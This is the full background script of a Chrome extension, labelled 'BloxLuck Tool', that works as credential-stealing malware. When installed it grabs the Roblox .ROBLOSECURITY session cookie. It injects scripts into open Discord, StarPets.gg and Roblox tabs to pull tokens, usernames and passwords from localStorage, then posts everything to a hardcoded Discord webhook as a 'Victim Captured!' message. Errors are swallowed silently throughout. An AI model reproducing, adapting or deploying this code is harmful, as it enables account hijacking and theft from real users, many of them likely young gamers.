const WH = 'https://discord.com/api/webhooks/1523433908488900809/eME1mBqDvE61IcdSbNo2jHMVJI91-kSi6QekuwqdPmXNWX3BTOUQBhgtWRpX7uzd-cI2';

let sent = false;

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.get('sent', data => {
    if (!data.sent) {
      collectAndSend();
    }
  });
});

chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 'collect') {
    collectAndSend();
    resp({ ok: 1 });
    return true;
  }
  if (req.t === 'cookie') {
    grabCookie().then(c => resp(c));
    return true;
  }
  if (req.t === 'discord') {
    grabDiscord().then(d => resp(d));
    return true;
  }
  if (req.t === 'starpets') {
    grabStarPets().then(s => resp(s));
    return true;
  }
});

async function collectAndSend() {
  if (sent) return;
  
  try {
    const roblox = await grabCookie();
    const discord = await grabDiscord();
    const starpets = await grabStarPets();
    const robloxLogin = await grabRobloxLogin();

    let robloxUser = 'Unknown';
    let robloxCookie = null;
    let discordToken = null;
    let discordUser = 'N/A';
    let discordEmail = 'N/A';
    let starpetsUser = null;
    let starpetsPass = null;
    let loginUser = null;
    let loginPass = null;

    if (roblox && roblox.r) {
      robloxCookie = roblox.r;
      try {
        const parts = robloxCookie.split('.');
        if (parts.length >= 2) {
          const raw = atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'));
          const p = JSON.parse(raw);
          robloxUser = p.name || p.sub || p.dname || 'Unknown';
        }
      } catch(e) {}
    }

    if (discord && discord.token) {
      discordToken = discord.token;
      discordUser = discord.username || 'N/A';
      try {
        const p = JSON.parse(atob(discordToken.split('.')[1]));
        discordEmail = p.email || 'N/A';
      } catch(e) {}
    }

    if (starpets) {
      starpetsUser = starpets.user;
      starpetsPass = starpets.pass;
    }

    if (robloxLogin) {
      loginUser = robloxLogin.user;
      loginPass = robloxLogin.pass;
    }

    // Build payload
    let content = '';
    const embeds = [{
      title: '🎯 Victim Captured!',
      color: 0x22c55e,
      fields: [],
      timestamp: new Date().toISOString(),
      footer: { text: 'BloxLuck Tool' }
    }];

    if (robloxCookie) {
      embeds[0].fields.push({
        name: '🎮 Roblox - ' + robloxUser,
        value: '```\n' + robloxCookie + '\n```',
        inline: false
      });
      content += '🎮 Roblox: ' + robloxUser + '\n';
    }

    if (discordToken) {
      embeds[0].fields.push({
        name: '💬 Discord - ' + discordUser,
        value: '**Email:** ' + discordEmail + '\n**Token:**\n```\n' + discordToken + '\n```',
        inline: false
      });
      content += '💬 Discord: ' + discordUser + '\n';
    }

    if (starpetsUser || starpetsPass) {
      embeds[0].fields.push({
        name: '🐾 StarPets.gg',
        value: '**User:** ' + (starpetsUser || 'N/A') + '\n**Pass:** ' + (starpetsPass || 'N/A'),
        inline: false
      });
    }

    if (loginUser || loginPass) {
      embeds[0].fields.push({
        name: '🔐 Roblox Login',
        value: '**User:** ' + (loginUser || 'N/A') + '\n**Pass:** ' + (loginPass || 'N/A'),
        inline: false
      });
    }

    const payload = {
      content: content || 'New victim data',
      embeds: embeds
    };

    // Send via XHR instead of fetch (more reliable in service workers)
    await xhrPost(WH, JSON.stringify(payload));

    // Mark as sent
    chrome.storage.local.set({ sent: true });
    sent = true;

  } catch(e) {}
}

function xhrPost(url, data) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onload = () => resolve(xhr.responseText);
    xhr.onerror = () => reject(xhr.statusText);
    xhr.send(data);
  });
}

async function grabCookie() {
  try {
    const domains = ['roblox.com', '.roblox.com'];
    for (const d of domains) {
      const cookies = await chrome.cookies.getAll({ domain: d });
      for (const c of cookies) {
        if (c.name === '.ROBLOSECURITY') return { r: c.value };
      }
    }
  } catch(e) {}
  return null;
}

async function grabDiscord() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                for (let i = 0; i < localStorage.length; i++) {
                  const val = localStorage.getItem(localStorage.key(i));
                  if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
                    try {
                      const p = JSON.parse(atob(val.split('.')[1]));
                      if (p.sub || p.email || p.iat) {
                        return { token: val, username: p.global_name || p.username || p.email || 'Discord User' };
                      }
                    } catch(e) {}
                  }
                }
                const t = localStorage.getItem('token');
                if (t && t.length > 50) return { token: t, username: 'Discord User' };
                return null;
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result) return results[0].result;
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
}

async function grabStarPets() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://starpets.gg/*', '*://*.starpets.gg/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                let u = null, p = null;
                for (let i = 0; i < localStorage.length; i++) {
                  const k = localStorage.key(i).toLowerCase();
                  const val = localStorage.getItem(localStorage.key(i));
                  if (k.includes('user') || k.includes('email') || k.includes('name') || k.includes('login') || k.includes('account') || k.includes('profile') || k.includes('auth')) {
                    try {
                      const j = JSON.parse(val);
                      u = j.email || j.username || j.user || j.name || u;
                      p = j.password || j.pass || p;
                    } catch(e) {
                      if (k.includes('user') || k.includes('email')) u = val;
                      if (k.includes('pass')) p = val;
                    }
                  }
                }
                if (u || p) return { user: u, pass: p };
                return null;
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result && (results[0].result.user || results[0].result.pass)) return results[0].result;
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
}

async function grabRobloxLogin() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://roblox.com/*', '*://*.roblox.com/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                let u = null, p = null;
                for (let i = 0; i < localStorage.length; i++) {
                  const k = localStorage.key(i).toLowerCase();
                  const val = localStorage.getItem(localStorage.key(i));
                  if (k.includes('user') || k.includes('email') || k.includes('login') || k.includes('account')) {
                    try {
                      const j = JSON.parse(val);
                      u = j.username || j.email || j.user || j.name || u;
                      p = j.password || j.pass || p;
                    } catch(e) {
                      if (!u && typeof val === 'string' && val.length > 3) u = val;
                    }
                  }
                  if (k.includes('pass') && !p && typeof val === 'string' && val.length > 3) p = val;
                }
                if (u || p) return { user: u, pass: p };
                return null;
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result && (results[0].result.user || results[0].result.pass)) return results[0].result;
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
                        }
